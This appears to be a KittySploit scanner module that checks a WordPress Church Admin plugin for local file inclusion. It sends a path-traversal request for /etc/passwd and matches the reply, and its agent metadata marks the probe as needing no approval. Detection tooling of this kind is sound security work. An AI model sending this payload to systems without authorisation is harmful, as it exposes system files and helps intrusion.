#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Church Admin 0."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Church Admin 0.33.2.1 - Local File Inclusion Detection',
        'description': 'WordPress Church Admin 0.33.2.1 is vulnerable to local file inclusion via the "key" parameter of plugins/church-admin/display/download.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'wordpress', 'wp-plugin', 'lfi', 'wpscan', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://wpscan.com/vulnerability/8997', 'https://id.wordpress.org/plugins/church-admin/'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="WordPress Church Admin 0.33.2.1 - Local File Inclusion detected",
                path='/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd',
            )
            return True
        return False

